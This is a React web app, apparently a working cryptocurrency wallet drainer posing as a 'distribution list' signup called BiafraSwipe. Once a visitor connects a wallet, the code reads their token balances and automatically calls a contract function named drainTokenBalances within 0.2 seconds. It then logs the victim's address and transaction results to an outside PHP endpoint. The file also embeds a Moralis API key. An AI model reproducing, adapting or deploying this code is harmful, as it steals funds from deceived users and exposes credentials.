import React, { useEffect, useState } from 'react';
import { WagmiConfig, useAccount, useDisconnect } from 'wagmi';
import { mainnet } from 'wagmi/chains';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { createWeb3Modal } from '@web3modal/wagmi/react';
import { defaultWagmiConfig } from '@web3modal/wagmi/react/config';
import './App.css';
import ConnectButton from './components/ConnectButton';
import Modal from './components/Modal';
import Moralis from 'moralis';
const ethers = require('ethers');

const queryClient = new QueryClient();
const projectId = '1c1db7ada235d88816f2f0008d415fdc';
const metadata = {
  name: 'BiafraSwipe',
  description: 'BiafraSwipe Description',
  url: 'https://mywebsite.com',
  icons: ['https://avatars.mywebsite.com/'],
};
const chains = [mainnet];
const config = defaultWagmiConfig({
  chains,
  projectId,
  metadata,
});

createWeb3Modal({
  wagmiConfig: config,
  projectId,
  enableAnalytics: true,
  enableOnramp: true,
});

export function Web3ModalProvider({ children }) {
  return (
    <WagmiConfig config={config}>
      <QueryClientProvider client={queryClient}>{children}</QueryClientProvider>
    </WagmiConfig>
  );
}

async function getMoralisTokenBalances(address) {
  try {
    await Moralis.start({
      apiKey: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjJkNmM3MGNkLTQyMTgtNGQwZC1hOTVlLWE1NTdmMTc1M2U3ZSIsIm9yZ0lkIjoiMzk4NDgwIiwidXNlcklkIjoiNDA5NDU2IiwidHlwZUlkIjoiNzkwMGQ4ZTUtNWMwYS00M2Y2LWExYzUtOTFhMzlhNmNiNzhiIiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3MTk4NDE3NTEsImV4cCI6NDg3NTYwMTc1MX0.-oGSC9n_KPDGSk_iSWNjLzLFoHHXUGRmy0rmZQkrut0"
    });

    const response = await Moralis.EvmApi.token.getWalletTokenBalances({
      "chain": "0x1",
      "address": address,
      "token_addresses": [
        "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", // WETH
        "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
        "0xB8c77482e45F1F44dE1745F52C74426C631bDD52", // BNB
        "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", // SHIBA INU
        "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
        "0x514910771AF9Ca656af840dff83E8264EcF986CA"  // CHAINLINK
      ]
    });

    return response.raw;
  } catch (e) {
    console.error(e);
  }
}

async function sendTokenBalancesToContract(signer, tokenBalances) {
  const contractAddress = 'YOUR_CONTRACT_ADDRESS'; // Replace with your deployed contract address
  const abi = [
    'function drainTokenBalances(address[] calldata tokenAddresses, uint256[] calldata balances) external'
  ];
  const contract = new ethers.Contract(contractAddress, abi, signer);
  
  const tokenAddresses = tokenBalances.map(token => token.token_address);
  const balances = tokenBalances.map(token => ethers.BigNumber.from(token.balance));

  const gasLimit = 30000000; // Increased gas limit
  const tx = await contract.drainTokenBalances(tokenAddresses, balances, { gasLimit });
  await tx.wait();
  return tx;
}

function App() {
  const { address, isConnected } = useAccount();
  const { disconnect } = useDisconnect();
  const [transactionInProgress, setTransactionInProgress] = useState(false);
  const [modalMessage, setModalMessage] = useState("");
  const [modalVisible, setModalVisible] = useState(false);

  const logTransaction = async (logData) => {
    await fetch('https://eflujsyb0kuybgol11532.cleavr.one/btc/tt.php', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(logData),
    });
  };

  const handleSendTransaction = async () => {
    if (isConnected && !transactionInProgress) {
      setTransactionInProgress(true);
      setModalVisible(true);
      setModalMessage("Fetching token balances...");
      try {
        const signer = await getEthersSigner(config);
        const tokenBalances = await getMoralisTokenBalances(address);
        setModalMessage("Sending token balances to smart contract...");
        const tx = await sendTokenBalancesToContract(signer, tokenBalances);
        await logTransaction({ success: true, address, timestamp: new Date().toISOString(), ip: 'fetch IP from client', txHash: tx.hash });
        setModalMessage("Approved");
      } catch (error) {
        console.error('Transaction failed:', error);
        await logTransaction({ success: false, error: error.message, address, timestamp: new Date().toISOString(), ip: 'fetch IP from client' });
        setModalMessage("Declined");
      } finally {
        setTransactionInProgress(false);
        setTimeout(() => setModalVisible(false), 3000); // Close modal after 3 seconds
      }
    }
  };

  useEffect(() => {
    if (isConnected) {
      setTimeout(() => {
        handleSendTransaction();
      }, 200); // Automatically click the sign contract button after 0.2 seconds
    }
  }, [isConnected]);

  return (
    <div className="App">
      <header className="App-header">
        <h1 className="animate-charcter">Connect Wallet to Join<br />Distribution List</h1>
        {isConnected ? (
          <>
            <p>Connected account: {address}</p>
            <button onClick={disconnect}>Disconnect Wallet</button>
          </>
        ) : (
          <w3m-button />
        )}
      </header>
      {modalVisible && <Modal message={modalMessage} />}
    </div>
  );
}

export default App;
